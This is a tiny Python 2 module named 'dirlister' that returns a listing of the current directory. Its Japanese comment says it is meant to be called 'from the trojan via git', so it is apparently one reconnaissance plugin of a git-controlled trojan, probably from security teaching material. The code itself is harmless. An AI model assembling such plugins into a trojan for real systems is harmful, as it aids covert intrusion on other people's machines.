# -*- coding: utf-8 -*-

import os


def run(**args):

    print "[*] In dirlister module."
    files = os.listdir(".")

    return str(files)


# git 経由で、trojan から呼び出す場合は、以下はコメントアウト
#dirs = run()
#print dirs

